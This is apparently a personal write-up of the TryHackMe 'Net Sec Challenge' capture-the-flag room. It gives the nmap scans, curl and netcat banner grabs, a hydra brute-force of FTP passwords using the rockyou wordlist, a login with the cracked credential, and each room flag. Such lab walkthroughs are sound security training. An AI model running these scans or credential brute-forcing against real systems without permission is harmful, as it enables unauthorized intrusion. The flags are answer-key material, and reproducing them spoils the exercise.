---
description: https://tryhackme.com/room/netsecchallenge
---

# Net Sec Challenge

## Task 2 Challenge Questions

#### What is the highest port number being open less than 10,000?

```bash
sudo nmap -n -p -10000 10.10.3.115
```

![](<../../.gitbook/assets/Screenshot from 2022-02-20 21-36-17.png>)

{% hint style="success" %}
8080
{% endhint %}

#### There is an open port outside the common 1000 ports; it is above 10,000. What is it?

```bash
sudo nmap -n -p 10000-20000 -T5 10.10.3.115
```

![](<../../.gitbook/assets/Screenshot from 2022-02-20 22-00-35.png>)

{% hint style="success" %}
10021
{% endhint %}

#### How many TCP ports are open?

{% hint style="success" %}
`6`
{% endhint %}

#### What is the flag hidden in the HTTP server header?

```bash
curl -I http://10.10.3.115
```

![curl -I http://10.10.3.115](<../../.gitbook/assets/Screenshot from 2022-02-20 22-05-51.png>)

{% hint style="success" %}
`THM{web_server_25352}`
{% endhint %}

#### What is the flag hidden in the SSH server header?

```bash
nc 10.10.3.115 22
```

![nc 10.10.3.115 22](<../../.gitbook/assets/Screenshot from 2022-02-20 22-10-00.png>)

{% hint style="success" %}
`THM{946219583339}`
{% endhint %}

#### We have an FTP server listening on a nonstandard port. What is the version of the FTP server?

```bash
nmap -n -sV -p 10021 10.10.3.115
```

![nmap -n -sV -p 10021 10.10.3.115](<../../.gitbook/assets/Screenshot from 2022-02-20 22-13-15.png>)

{% hint style="success" %}
`vsftpd 3.0.3`
{% endhint %}

#### We learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP?

```bash
echo 'eddie\nquinn' > user.txt
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.3.115:10021
```

![hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.3.115:10021](<../../.gitbook/assets/Screenshot from 2022-02-20 22-17-34.png>)

```bash
lftp -u quinn,andrea -p 10021 10.10.3.115
lftp quinn@10.10.3.115:/> ls
lftp quinn@10.10.3.115:/> cat ftp_flag.txt
```

![lftp -u quinn,andrea -p 10021 10.10.3.115](<../../.gitbook/assets/Screenshot from 2022-02-20 22-22-26.png>)

{% hint style="success" %}
`THM{321452667098}`
{% endhint %}

#### <mark style="color:red;">Browsing to http://10.10.3.115:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?</mark>

```bash
nmap -n -sN 10.10.1.145
```

![](<../../.gitbook/assets/Screenshot from 2022-02-21 00-57-56.png>)

{% hint style="success" %}
`THM{f7443f99}`
{% endhint %}
